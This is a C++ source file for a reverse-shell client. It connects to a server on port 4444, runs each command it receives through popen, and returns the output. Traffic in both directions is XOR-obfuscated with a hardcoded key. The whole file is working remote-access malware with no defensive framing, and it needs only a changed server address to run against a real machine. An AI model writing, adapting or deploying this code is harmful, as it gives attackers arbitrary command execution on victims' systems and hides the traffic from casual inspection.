#include <arpa/inet.h>
#include <array>
#include <iostream>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include "encryption.hpp"

const std::string XOR_KEY = "mysecretkey"; // Shared key

constexpr const char *SERVER_IP = "127.0.0.1";
constexpr int PORT = 4444;

std::string exec(const std::string &cmd) {
  std::array<char, 128> buffer;
  std::string result;
  FILE *pipe = popen(cmd.c_str(), "r");
  if (!pipe)
    return "popen() failed!";
  while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
    result += buffer.data();
  }
  pclose(pipe);
  return result;
}

int main() {
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock < 0) {
    perror("socket");
    return 1;
  }

  sockaddr_in server_addr{};
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(PORT);
  inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

  if (connect(sock, (sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
    perror("connect");
    return 1;
  }

  std::cout << "[+] Connected to server\n";

  char buffer[1024] = {};

  while (true) {
    int bytes_received = recv(sock, buffer, sizeof(buffer), 0);
    std::string encrypted(buffer, bytes_received);

    if (bytes_received <= 0)
      break;

    // std::string command(buffer, bytes_received);

    // decrypt commands recieved
    std::string command = xor_decrypt(encrypted, XOR_KEY);

    if (command == "exit")
      break;

    std::string output = exec(command);

    // send(sock, output.c_str(), output.size(), 0);
    std::string encrypted_output = xor_encrypt(output, XOR_KEY);
    send(sock, encrypted_output.c_str(), encrypted_output.size(), 0);
  }

  close(sock);
  return 0;
}
